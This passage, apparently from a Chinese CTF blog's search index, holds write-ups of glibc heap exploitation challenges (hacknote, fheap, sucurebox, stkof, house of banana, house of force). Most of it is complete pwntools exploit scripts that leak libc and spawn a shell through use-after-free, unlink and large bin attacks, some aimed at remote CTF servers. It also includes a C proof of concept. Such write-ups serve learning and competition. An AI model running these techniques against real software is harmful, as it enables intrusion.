exit&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;free?&#x27;,str(offset))def show(offset):   sh.sendlineafter(&#x27;[5] : exit&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;leak?&#x27;,str(offset))fake_chunk = p64(0) + p64(0x91)fake_chunk += &#x27;a&#x27;*0x80fake_chunk += p64(0) + p64(0x21)fake_chunk += &#x27;b&#x27;*0x10fake_chunk += p64(0) + p64(0x21)fake_chunk += &#x27;c&#x27;*0x10edit(0,len(fake_chunk),fake_chunk)delete(0x10)show(0x10)sh.recvuntil(&#x27;\\n&#x27;)heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))print &#x27;heap_addr=&#x27;,hex(heap_addr)edit(0x10,1,p8(0x89))show(0x10)sh.recvuntil(&#x27;\\n&#x27;)mmap_addr = u64(&#x27;\\x00&#x27; + sh.recvuntil(&#x27;\\n&#x27;,drop = True).ljust(7,&#x27;\\x00&#x27;))print &#x27;mmap_addr=&#x27;,hex(mmap_addr)edit(0x10,1,p8(0x98))show(0x10)sh.recvuntil(&#x27;\\n&#x27;)main_arena_88 = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sone_gadget_addr = libc_base + one_gadgetprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)fake_chunk = p64(0) + p64(0x21)fake_chunk += &#x27;a&#x27;*0x10fake_chunk += p64(0) + p64(0x21)fake_chunk += &#x27;b&#x27;*0x10edit(0,len(fake_chunk),fake_chunk)#放入一个chunk到fastbindelete(0x10)edit(0x8,8,p64(one_gadget_addr)) #布置虚表指针state_addr = heap_addr - 0x30delete(state_addr - mmap_addr) #将fake_chunk连接到state的fd处，也就是覆盖了原来的虚表指针，指向我们可以控制的地方，布下了one_gadget函数指针sh.interactive()","categories":["CTF"],"tags":["unsorted bin","fastbin"]},{"title":"hacknote","url":"/2019/11/09/hacknote/","content":"首先，查看程序的保护机制\n\n\n然后拖入IDA分析\n\n\n这是创建堆，并写入信息。\n经过分析，大概是这样的\ntypedef struct Note &#123;      void *func; //函数指针      char *buf; //内容指针  &#125; Note;    //保存Node的指针数组  Note *notes[5];  int i = 0;    void show(Note *note) &#123;      //显示buf的内容      puts((char *)(note + 4));  &#125;    void create(int size) &#123;      Note *note = (Note *)malloc(0x8);      note-&gt;func = show;      note-&gt;buf = (char *)malloc(size);      notes[i++] = note;  &#125;  \n\n再看看print功能\n\n\n即调用notes[i]-&gt;func(notes[i]);  \n再看看delete功能\n\n\nFree后没有把指针设置为NULL，这将会引起UAF漏洞\n上述的释放是这样的\nfree(note[i]-&gt;buf);  free(note[i]);  \n如何利用UAF呢？\n首先，我们先创建2个0x20的堆，释放后由fastbin或tcache bin维护\n释放后，堆布局如下\n\n\n\n块\n大小(字节)\n状态\n\n\n\nNote0\n0x8\n空闲\n\n\nBuf0\n0x20\n空闲\n\n\nNote1\n0x8\n空闲\n\n\nBuf1\n0x20\n空闲\n\n\n现在我们create(0x8)，那么先会有\nNote *note = (Note *)malloc(0x8);  \nFastbin或tcache bin中存在0x8的空闲块，那么直接返回那个空闲块的地址，这里返回的是note1的地址(因为fastbin或tcache使用单向链表维护，并且遵循后进先出的规则)\n接下来，执行\nnote-&gt;buf = (**char** *)malloc(size);  \n返回了note0的地址，由于我们的字符串是可以写入buf的，因此，我们写的字符串正好就可以写入note0的结构体。\n那么，我们就可以修改note0的func和buf，来执行其他函数了。\n首先，我们需要得到libc基地址，那么我们需要泄露一个函数的地址，这里，我们选用puts\npayload = p32(0x804862B) + p32(puts_got)  #这个8字节空间正好分配到了note0的结构体处  create(0x8,payload)    #泄露puts的加载地址  show(0)\n\n接下来，我们用同样的方法\n删除堆2,那么，现在堆的布局如下\n\n\n\n块\n大小(字节)\n状态\n\n\n\nBuf2 (Note0)\n0x8\n空闲\n\n\nBuf0\n0x20\n空闲\n\n\nNote2 (Note1)\n0x8\n空闲\n\n\nBuf1\n0x20\n空闲\n\n\n我们再create(0x8)，和上面同理\nNote3分配到Note2 (Note1)处,Buf3分配到Buf2 (Note0)处\npayload = p32(system_addr) + &#x27;||sh&#x27;  create(0x8,payload)  # get shell  show(0) \n\n这个**||sh**是shell注入，因为按照原来的show的逻辑,是这样的\nsystem(note[i]);   \n而note[i]是一个结构体，前四字节是system的地址，接下来是||sh字符串，所以，传给system的字符串实际上时xxxx||sh，这是一种或表达式，相当于注入一样\n因此，我们最终的exp脚本为\n#coding:utf8  from pwn import *  from LibcSearcher import *    #sh = process(&#x27;./hacknote&#x27;)  sh = remote(&#x27;111.198.29.45&#x27;,33242)  elf = ELF(&#x27;./hacknote&#x27;)  puts_got = elf.got[&#x27;puts&#x27;]  puts_plt = elf.plt[&#x27;puts&#x27;]  show_addr = 0x804862B    def create(size,content):     sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;Note size :&#x27;,str(size))     sh.sendafter(&#x27;Content :&#x27;,content)    def delete(index):     sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;Index :&#x27;,str(index))    def show(index):     sh.sendlineafter(&#x27;Your choice :&#x27;,&#x27;3&#x27;)     sh.sendlineafter(&#x27;Index :&#x27;,str(index))    #创建二个堆  create(0x20,&#x27;a&#x27;*0x20)  create(0x20,&#x27;b&#x27;*0x20)  delete(0)  delete(1)  payload = p32(0x804862B) + p32(puts_got)  #这个8字节空间正好分配到了note0的结构体处  create(0x8,payload)    #泄露puts的加载地址  show(0)  #获得puts的加载地址  puts_addr = u32(sh.recv(4))    libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)  print hex(puts_addr)  libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)  print &#x27;libc base:&#x27;,hex(libc_base)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)  &#x27;&#x27;&#x27;&#x27;&#x27; libc = ELF(&#x27;/usr/lib/libc-2.17.so&#x27;) libc_base = puts_addr - libc.sym[&#x27;puts&#x27;] print &#x27;libc base:&#x27;,hex(libc_base) system_addr = libc_base + libc.sym[&#x27;system&#x27;] binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next() &#x27;&#x27;&#x27;    delete(2)  payload = p32(system_addr) + &#x27;||sh&#x27;  create(0x8,payload)  # get shell  show(0)    sh.interactive()  ","categories":["CTF"],"tags":["tcache","UAF","命令注入"]},{"title":"hctf2016_fheap","url":"/2020/06/10/hctf2016_fheap/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，add函数中，如果字符串长度大于15，则单独malloc一块内存存放字符串，否则直接存结点里。\n\n\nDelete功能没有清空指针，因此，存在UAF， \n\n\n我们可以第字节将节点里的free代理函数指针修改掉，利用低字节覆盖，使其指向printf函数plt表，这样，当我们用UAF去delete这个堆时，就会调用printf，这样我们可以利用格式化字符串去泄露数据。然后就可以利用UAF，去执行system函数了。\n#coding:utf8#需要爆破4bitfrom pwn import *context.log_level = &#x27;debug&#x27;libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)def add(size,content):   sh.sendlineafter(&#x27;3.quit&#x27;,&#x27;create &#x27;)   sh.sendlineafter(&#x27;size:&#x27;,str(size + 1))   sh.sendafter(&#x27;str:&#x27;,content + &#x27;\\x00&#x27;)def delete(index):   sh.sendlineafter(&#x27;3.quit&#x27;,&#x27;delete &#x27;)   sh.sendlineafter(&#x27;id:&#x27;,str(index))   sh.sendlineafter(&#x27;Are you sure?:&#x27;,&#x27;yes&#x27;)def exploit():   add(0x10,&#x27;a&#x27;*0x10) #0   add(0x10,&#x27;b&#x27;*0x10) #1   delete(1)   delete(0)   #低字节覆盖为printf   add(0x20,&#x27;%22$p&#x27;.ljust(0x18,&#x27;b&#x27;) + p16(0x59D0)) #0   delete(1)   sh.recvuntil(&#x27;0x&#x27;)   libc_base = int(sh.recvuntil(&#x27;b&#x27;,drop = True),16) - libc.symbols[&#x27;_IO_2_1_stdout_&#x27;]   system_addr = libc_base + libc.sym[&#x27;system&#x27;]   print &#x27;libc_base=&#x27;,hex(libc_base)   print &#x27;system_addr=&#x27;,hex(system_addr)   #再用同样的方法，将函数指针覆盖为system   add(0x10,&#x27;a&#x27;*0x10) #1   add(0x10,&#x27;b&#x27;*0x10) #2   delete(2)   delete(1)   add(0x20,&#x27;/bin/sh;&#x27;.ljust(0x18,&#x27;a&#x27;) + p64(system_addr))   #getshell   delete(2)while True:   try:      global sh      #sh = process(&#x27;./pwn-f&#x27;)      sh = remote(&#x27;node3.buuoj.cn&#x27;,28400)      exploit()      sh.interactive()   except:      sh.close()      print &#x27;trying...&#x27;sh.interactive()","categories":["CTF"],"tags":["UAF","格式化字符串漏洞","partial write bypass PIE"]},{"title":"hfctf_2020_sucurebox(0地址引用)","url":"/2020/06/11/hfctf_2020_sucurebox/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，在add功能里，size的判断不准确，导致size可以很大，使得malloc(size)返回0，但是没有检查malloc的返回值\n\n\n然后，edit功能里可以指定offset和len，这样，我们就能在整个内存里进行读写了。\n\n\n#coding:utf8from pwn import *#sh = process(&#x27;./hfctf_2020_sucurebox&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,25367)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]free_hook_s = libc.symbols[&#x27;__free_hook&#x27;]system_s = libc.sym[&#x27;system&#x27;]def add(size):   sh.sendlineafter(&#x27;5.Exit&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Size:&#x27;,str(size))   sh.recvuntil(&#x27;Key:&#x27;)   sh.recvuntil(&#x27;\\n&#x27;)   strs = sh.recvuntil(&#x27;\\n&#x27;,drop = True).strip().split(&#x27; &#x27;)   data = []   for x in strs:      if x == &#x27;&#x27;:         continue      data.append(int(x,16))   return datadef delete(index):   sh.sendlineafter(&#x27;5.Exit&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Box ID:&#x27;,str(index))def enc(index,off,len,msg):   sh.sendlineafter(&#x27;5.Exit&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Box ID:&#x27;,str(index))   sh.sendlineafter(&#x27;Offset of msg:&#x27;,str(off))   sh.sendlineafter(&#x27;Len of msg:&#x27;,str(len))   sh.sendafter(&#x27;Msg:&#x27;,msg)def show(index,off,len):   sh.sendlineafter(&#x27;5.Exit&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Box ID:&#x27;,str(index))   sh.sendlineafter(&#x27;Offset of msg:&#x27;,str(off))   sh.sendlineafter(&#x27;Len of msg:&#x27;,str(len))def tranLong(data):   if data &amp; 0x8000000000000000 != 0:      return data - 0x10000000000000000   else:      return datafor i in range(8):   add(0x200)for i in range(1,8):   delete(i)delete(0)key = add(0x200) #0data = &#x27;/bin/sh\\x00&#x27;ans = &#x27;&#x27;for i in range(8):   ans += p8(ord(data[i]) ^ key[i])enc(0,0,0x8,ans)for i in range(7):   add(0x200)show(7,0x8,0x8)sh.recvuntil(&#x27;Msg:&#x27;)sh.recvuntil(&#x27;\\n&#x27;)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sfree_hook_addr = libc_base + free_hook_ssystem_addr = libc_base + system_sprint &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)print &#x27;system_addr=&#x27;,hex(system_addr)#malloc返回0，由于程序没有检查，所以可以任意地址读写key = add(tranLong(0xFFFFFFFF00000FFF))data = p64(system_addr)ans = &#x27;&#x27;for i in range(8):   ans += p8(ord(data[i]) ^ key[i])enc(8,tranLong(free_hook_addr),8,ans)#getshelldelete(0)sh.interactive()","categories":["CTF"],"tags":["null reference","malloc未检查返回值"]},{"title":"hitcon2014_stkof","url":"/2020/04/09/hitcon2014_stkof/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下,edit功能存在溢出。\n\n\n程序没有show功能。\n\n\n由于没有开启PIE，got表也可以修改，因此，我们利用unlink控制堆指针为got表，然后修改strlen的got表为puts的plt表，即可实现show的功能，进而泄露glibc地址，后续利用。\n#coding:utf8from pwn import *from LibcSearcher import *#sh = process(&#x27;./stkof&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,27832)elf = ELF(&#x27;./stkof&#x27;)strlen_got = elf.got[&#x27;strlen&#x27;]free_got = elf.got[&#x27;free&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]heap_ptr_addr = 0x0000000000602150def add(size):   sh.sendline(&#x27;1&#x27;)   sh.sendline(str(size))   sh.recvuntil(&#x27;OK&#x27;)def edit(index,size,content):   sh.sendline(&#x27;2&#x27;)   sh.sendline(str(index))   sh.sendline(str(size))   sh.send(content)   sh.recvuntil(&#x27;OK&#x27;)def delete(index):   sh.sendline(&#x27;3&#x27;)   sh.sendline(str(index))def show(index):   sh.sendline(&#x27;4&#x27;)   sh.sendline(str(index))   sh.recvuntil(&#x27;OK&#x27;)#1，消耗内存碎片，使得后面的chunk可以相邻add(0x1000)#2add(0x80)#3add(0x80)#4add(0x10)edit(4,0x8,&#x27;/bin/sh\\x00&#x27;)#伪造好fd和bk，然后伪造好chunk3的prev、sizefake_chunk = p64(0) + p64(0x81)fake_chunk += p64(heap_ptr_addr - 0x18) + p64(heap_ptr_addr - 0x10)fake_chunk = fake_chunk.ljust(0x80,&#x27;a&#x27;)edit(2,0x90,fake_chunk + p64(0x80) + p64(0x90))#unlinkdelete(3)#现在可以控制堆指针了payload = p64(0) + p64(strlen_got) + p64(free_got)edit(2,0x18,payload)#修改strlen的got表为puts的plt表edit(0,0x8,p64(puts_plt))#泄露free的got表地址show(1)sh.recv(1)free_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;free&#x27;,free_addr)libc_base = free_addr - libc.dump(&#x27;free&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)#修改free的got表为system的地址edit(1,0x8,p64(system_addr))#getshelldelete(4)sh.interactive()","categories":["CTF"],"tags":["unlink","unsorted bin","堆溢出"]},{"title":"house_of_banana","url":"/2020/12/07/house-of-banana/","content":"文章首发于安全KER https://www.anquanke.com/post/id/222948\n0x01 前言总结出的一种新型堆利用手法，适用于目前所有的glibc版本，我暂且命名它为house of banana~。\n0x02 新版glibc的改进从glibc 2.28开始，_int_malloc中增加了对unsorted bin的bk的校验，使得unsorted bin attack变得不可行。\n/* remove from unsorted list */if (__glibc_unlikely (bck-&gt;fd != victim))  malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);\n此时，我们可以考虑使用large bin attack，使用house of strom实现任意地址分配；然而，从glibc2.29开始，检查变得更加严格，house of strom不能用了\nif (__glibc_unlikely (size &lt;= 2 * SIZE_SZ)    || __glibc_unlikely (size &gt; av-&gt;system_mem))  malloc_printerr (&quot;malloc(): invalid size (unsorted)&quot;);if (__glibc_unlikely (chunksize_nomask (next) &lt; 2 * SIZE_SZ)    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))  malloc_printerr (&quot;malloc(): invalid next size (unsorted)&quot;);if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))  malloc_printerr (&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;);if (__glibc_unlikely (bck-&gt;fd != victim)    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))  malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);if (__glibc_unlikely (prev_inuse (next)))  malloc_printerr (&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;);\n但是幸运的是large bin attack仍然可以使用\nif ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))                    /* Always insert in the second position.  */                    fwd = fwd-&gt;fd;                  else                    &#123;                      victim-&gt;fd_nextsize = fwd;                      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;                      fwd-&gt;bk_nextsize = victim;                      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                    &#125;                  bck = fwd-&gt;bk;\n然而从glibc 2.30开始，常规large bin attack方法也被封堵\nif ((unsigned long) size\t  == (unsigned long) chunksize_nomask (fwd))                      /* Always insert in the second position.  */                      fwd = fwd-&gt;fd;                    else                      &#123;                        victim-&gt;fd_nextsize = fwd;                        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;                        if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))                          malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);                        fwd-&gt;bk_nextsize = victim;                        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                      &#125;                    bck = fwd-&gt;bk;                    if (bck-&gt;fd != fwd)                      malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);\n0x03 large bin attack在新版glibc中的利用那是否意味着large bin attack不能用了呢，其实不是，以前的large bin attack手法，都是在下面第二个分支里进行在最新版的glibc 2.32里，我们看到，第二个分支里确实封堵了以前的利用手法，但是在第一个分支里，仍然可以实现large bin attack，但是该分支利用起来，只是完成往任意地址写一个堆地址的作用，因为这里的bck-&gt;bk才是我们的large bin，因此分析来看，我们能够控制的也就是图中第一个分支中的fwd-&gt;fd-&gt;bk_nextsize，而完成写的操作是在fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; 这句中，即可以往任意地址写上这个unsorted bin chunk堆的地址。而以前旧版large bin attack是可以往任意的两个地址写两个堆地址。\n0x04 house of banana适用场景（满足任一条件即可）：1.程序能够显式的执行exit函数2.程序通过libc_start_main启动的主函数，且主函数能够结束原理分析在ld.so里，存在一个_rtld_global指针，指向rtld_global结构体该结构体较为复杂\nstruct rtld_global&#123;#endif  /* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;     must remain the first element.  Forever.  *//* Non-shared code has no support for multiple namespaces.  */#ifdef SHARED# define DL_NNS 16#else# define DL_NNS 1#endif  EXTERN struct link_namespaces  &#123;    /* A pointer to the map for the main map.  */    struct link_map *_ns_loaded;    /* Number of object in the _dl_loaded list.  */    unsigned int _ns_nloaded;    /* Direct pointer to the searchlist of the main object.  */    struct r_scope_elem *_ns_main_searchlist;    /* This is zero at program start to signal that the global scope map is       allocated by rtld.  Later it keeps the size of the map.  It might be       reset if in _dl_close if the last global object is removed.  */    unsigned int _ns_global_scope_alloc;    /* During dlopen, this is the number of objects that still need to       be added to the global scope map.  It has to be taken into       account when resizing the map, for future map additions after       recursive dlopen calls from ELF constructors.  */    unsigned int _ns_global_scope_pending_adds;    /* Once libc.so has been loaded into the namespace, this points to       its link map.  */    struct link_map *libc_map;    /* Search table for unique objects.  */    struct unique_sym_table    &#123;      __rtld_lock_define_recursive (, lock)      struct unique_sym      &#123;\tuint32_t hashval;\tconst char *name;\tconst ElfW(Sym) *sym;\tconst struct link_map *map;      &#125; *entries;      size_t size;      size_t n_elements;      void (*free) (void *);    &#125; _ns_unique_sym_table;    /* Keep track of changes to each namespace&#x27; list.  */    struct r_debug _ns_debug;  &#125; _dl_ns[DL_NNS];  /* One higher than index of last used namespace.  */  EXTERN size_t _dl_nns;.................................................................................&#125;;\n其中我们看到里面有多个_dl_ns结构体，调试发现，该结构体存储着的实际就是elf各段的符号结构体，类似于IDA中的段结构体我们较为关注的是fini_array段的动态链接结构体指针该结构体实际在在_dl_fini中被使用\n     if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)&#123;  ElfW(Addr) *array =    (ElfW(Addr) *) (l-&gt;l_addr\t\t    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);  unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val\t\t    / sizeof (ElfW(Addr)));  while (i-- &gt; 0)    ((fini_t) array[i]) ();&#125;\n汇编中对应的代码如下因此，伪造该结构体指针，可以使得array指向我们可控的数据区，从而布置下一系列函数，进而劫持程序的流，那么house of banana的思想就是利用large bin attack往rtld_global写入堆的地址，并事先在堆里伪造好rtld_global结构体，这样程序exit或者正常退出main函数时，便会执行到伪造的fini_array数组。\npocpoc需要根据环境需要修改偏移，在有些情况下，rtld_global_ptr与libc_base的偏移在本地与远程并不是固定的，可能会在地址的第2字节处发生变化，因此可以爆破256种可能得到远程环境的精确偏移。\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void backdoor() &#123;   puts(&quot;you hacked me!!&quot;);   system(&quot;/bin/sh&quot;);&#125;int main() &#123;   puts(&quot;house of banana&#x27;s poc&quot;);   size_t libc_base = &amp;puts - 0x87490;   size_t _rtld_global_ptr_addr = libc_base + 0x227060;   char *ptr0 = malloc(0x450);   char *gap = malloc(0x10);   char *ptr1 = malloc(0x440);   gap = malloc(0x10);   char *ptr2 = malloc(0x410);   gap = malloc(0x10);   free(ptr0);   //put ptr9 into large bin   malloc(0x500);   free(ptr1); //free ptr1 into unsorted bin   free(ptr2); //free ptr2 into unsorted bin   //bk_nextsize = _rtld_global_ptr_addr   *(size_t *)(ptr0 + 0x18) = _rtld_global_ptr_addr - 0x20;   malloc(0x410); //large bin attack to  hijack _rtld_global_ptr   //fake a _rtld_global   size_t fake_rtld_global_addr = ptr1 - 0x10;   size_t *fake_rtld_global = (size_t *)ptr1;   char buf[0x100];   //the chain&#x27;s length must &gt;= 4   fake_rtld_global[1] = &amp;fake_rtld_global[2];   fake_rtld_global[3] = fake_rtld_global_addr;   fake_rtld_global[2+3] = &amp;fake_rtld_global[3];   fake_rtld_global[2+5] = &amp;fake_rtld_global[2];   fake_rtld_global[3+3] = &amp;fake_rtld_global[8];   fake_rtld_global[3+5] = &amp;fake_rtld_global[3];   fake_rtld_global[8+3] = 0;   fake_rtld_global[8+5] = &amp;fake_rtld_global[8];   //fake a fini_array segment   fake_rtld_global[0x20] = &amp;fake_rtld_global[0x30];   fake_rtld_global[0x22] = &amp;fake_rtld_global[0x23];   fake_rtld_global[0x23+1] = 0x8; //func ptrs total len   fake_rtld_global[0x30] = 0x1A;   fake_rtld_global[0x31] = 0;   fake_rtld_global[-2] = &amp;fake_rtld_global[0x32];   //funcs   fake_rtld_global[0x32] = backdoor;   fake_rtld_global[0x61] = 0x800000000;&#125;\n0x05 实例应用西湖论剑2020决赛 huskadd函数中的size的范围为large bin范围delete功能里未清空指针，存在UAF程序有edit和show功能，glibc版本为2.30，由于程序基址无法知道，不能用unlink的方法，因此，可以使用house of banana\nexp#coding:utf8from pwn import *sh = process(&#x27;./husk&#x27;,env = &#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)libc = ELF(&#x27;./libc.so.6&#x27;)#sh = remote(&#x27;100.1.0.111&#x27;,9999)def add(size,content = &#x27;&#x27;):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Size:&#x27;,str(size))   if content != &#x27;&#x27;:      sh.sendafter(&#x27;Content:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))def show(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))def edit(index,content):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))   sh.sendafter(&#x27;Content:&#x27;,content)add(0x520,&#x27;a&#x27;*0x520) #0add(0x428,&#x27;b&#x27;*0x428) #1add(0x500,&#x27;c&#x27;*0x500) #2add(0x420,&#x27;d&#x27;*0x420) #3delete(0)add(0x600,&#x27;c&#x27;*0x600) #4add(0x600,&#x27;c&#x27;*0x600) #5show(0)sh.recvuntil(&#x27;Content: &#x27;)main_arena_xx = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))libc_base = main_arena_xx - 0x1eb010print &#x27;libc_base=&#x27;,hex(libc_base)global_max_fast = libc_base + 0x1edb78print &#x27;global_max_fast=&#x27;,hex(global_max_fast)rtl_global = libc_base + 0x220060print &#x27;rtl_global=&#x27;,hex(rtl_global)set_context = libc_base + libc.sym[&#x27;setcontext&#x27;] + 0x3Dret = libc_base + libc.sym[&#x27;setcontext&#x27;] + 0x14Epop_rdi = libc_base + 0x00000000000277e9binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()system_addr =  libc_base + libc.sym[&#x27;system&#x27;]#print hex(libc_base + 0x2043ac)edit(0,&#x27;a&#x27;*0x10)show(0)sh.recvuntil(&#x27;a&#x27;*0x10)heap_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))print &#x27;heap_addr=&#x27;,hex(heap_addr)edit(0,p64(main_arena_xx)*2)#未归位的large bindelete(2)delete(4)#控制large bin的bkedit(0,p64(0) + p64(0) + p64(0) + p64(rtl_global - 0x20))#raw_input()add(0x600,&#x27;large bin attack!!&#x27;)payload = p64(0) + p64(libc_base + 0x221730) + p64(0) + p64(heap_addr + 0x960)payload += p64(set_context) + p64(ret)payload += p64(binsh_addr)payload += p64(0)payload += p64(system_addr)payload += &#x27;\\x00&#x27;*0x80payload += p64(heap_addr + 0x960 + 0x28 + 0x18)payload += p64(pop_rdi)payload = payload.ljust(0x100,&#x27;\\x00&#x27;)payload += p64(heap_addr + 0x960 + 0x10 + 0x110)*0x3payload += p64(0x10)payload = payload.ljust(0x31C - 0x10,&#x27;\\x00&#x27;)payload += p8(0x8)edit(2,payload)edit(1,&#x27;b&#x27;*0x420 + p64(heap_addr + 0x960 + 0x20))#getshellsh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;5&#x27;)sh.sendlineafter(&#x27;name:&#x27;,&#x27;haivk&#x27;)sh.interactive()\n0x06 感想house of banana将会是一种新型的利用手法，且向下兼容老版本glibc。其实只要能实现往任意地址写一个堆地址，都可以利用这种方法。\n","categories":["CTF","安全研究"],"tags":["堆风水","linkmap","house of banana","glibc >= 2.28","large bin attack"]},{"title":"house_of_force_i春秋force","url":"/2020/02/26/house_of_force_i%E6%98%A5%E7%A7%8Bforce/","content":"House of force能够使我们将堆申请到任意地址，满足以下条件，即可达到利用\n\n能够改写top chunk的size域\n\n能够自由控制堆分配大小\n\n能够知道目标地址与top chunk地址之间的距离(可以泄露地址，计算出偏移)\n\n\n详细见CTF-WIKIhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/\nForce我们以i春秋2020新春战役的force这题为例\n首先，我们检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，发现程序显示给我们堆地址，那么我们就不用泄露了。并且如果我们申请的堆较小，read可以溢出，如果在top chunk上方，就能修改top chunk的size。\n\n\n现在关键是泄露libc地址。Show功能没有用，是一个忽悠。\n\n\n泄露libc地址，其实也是从add函数里着手，既然程序显示给我们堆地址，那么**[如果我们申请的堆足够大，malloc就会使用mmap来分配内存，而mmap分配的内存靠近libc，与libc的偏移是固定的，那么，我们就能计算出libc地址。]{.mark}**\n几个条件都达成了，那么，我们就能利用house of force将堆申请到malloc_hook，写malloc_hook即可。\n综上，我们的exp脚本\n#coding:utf8  from pwn import *    #sh = process(&#x27;./force&#x27;)  sh = remote(&#x27;node3.buuoj.cn&#x27;,26394)  libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)  realloc_s = libc.sym[&#x27;realloc&#x27;]  malloc_hook_s = libc.symbols[&#x27;__malloc_hook&#x27;]  one_gadget = 0x4526a    def create(size,content):     sh.sendlineafter(&#x27;2:puts&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;size&#x27;,str(size))     sh.recvuntil(&#x27;bin addr &#x27;)     addr = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)     sh.sendafter(&#x27;content&#x27;,content)     return addr    #通过mmap一个堆，我们得到了mmap的堆的地址，就能计算出libc地址  #因为mmap的这个堆靠近libc的地址  libc_base = create(0x200000,&#x27;a&#x27;) + 0x200FF0  realloc_addr = libc_base + realloc_s  malloc_hook_addr = libc_base + malloc_hook_s  one_gadget_addr = libc_base + one_gadget  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr)  print &#x27;one_gadget_addr=&#x27;,hex(one_gadget_addr)  #house of force  #修改top chunk的size为-1，即超级大  heap_addr = create(0x10,&#x27;\\x00&#x27;*0x18 + p64(0xFFFFFFFFFFFFFFFF)) - 0x10  print &#x27;heap_addr=&#x27;,hex(heap_addr)    top_chunk_addr = heap_addr + 0x20  print &#x27;top_chunk_addr=&#x27;,hex(top_chunk_addr)  #分配偏移大小的chunk，将top chunk移到了malloc_hook_addr - 0x20处  offset = malloc_hook_addr - top_chunk_addr - 0x30  create(offset,&#x27;c&#x27;)  #分配到relloc_hook处，写同时realloc_hook和malloc_hook  create(0x10,p64(0) + p64(one_gadget_addr) + p64(realloc_addr + 4))  #getshell  